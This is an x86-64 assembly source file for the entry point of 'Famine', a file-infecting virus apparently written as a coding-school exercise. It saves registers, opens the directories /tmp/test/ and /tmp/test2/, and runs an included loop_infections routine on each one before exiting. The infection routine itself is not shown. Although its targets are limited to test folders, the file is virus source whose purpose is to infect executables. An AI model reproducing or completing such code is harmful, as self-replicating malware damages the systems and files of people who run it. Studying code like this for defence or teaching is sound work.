%include "define.asm"
%include "loop_infections.asm"

%define fd		 rbp-0x4

%macro prelude 0
pushfq
push rax
push rdi
push rsi
push rsp
push rdx
push rcx
push r8
push r9
push r10
push r11
push r12
push r13
push r14
push r15
%endmacro

%macro postlude 0
pop r15
pop r14
pop r13
pop r12
pop r11
pop r10
pop r9
pop r8
pop rcx
pop rdx
pop rsp
pop rsi
pop rdi
pop rax
popfq
jmp exit
%endmacro


	global _start
;	extern loop_infections

	segment .text

signature: 
	.string db "Famine version 1.0 (c)oded by ryaoi", 10, 00

repo1: 
	call ret_repo1
	.string db "/tmp/test/", 00

repo2: 
	call ret_repo2
	.string db "/tmp/test2/", 00

exit:
	mov rax, SYS_EXIT
	syscall

_start:
	prelude
	sub rsp, 0x10

; open first file
	jmp repo1
ret_repo1:
	pop rdi
	mov r15, rdi
	mov rsi, O_RDDIR
	mov rax, SYS_OPEN
	syscall
	mov rdi, rax
	mov rsi, r15
	mov [rsp+0x08], rdi		; save fd
	call loop_infections 	; loop_infecion(int fd, char *name)
	mov rdi, [rsp+0x08]
	mov rax, SYS_CLOSE
	syscall

; open second file
	jmp repo2
ret_repo2:
	pop rdi
	mov r15, rdi
	mov rsi, O_RDDIR
	mov rax, SYS_OPEN
	syscall
	mov rdi, rax
	mov rsi, r15
	mov [rsp+0x8], rdi		; save fd
	call loop_infections		; loop_infection(int fd, char *name)
	mov rdi, [rsp+0x8]
	mov rax, SYS_CLOSE
	syscall
	add rsp, 0x10
	postlude
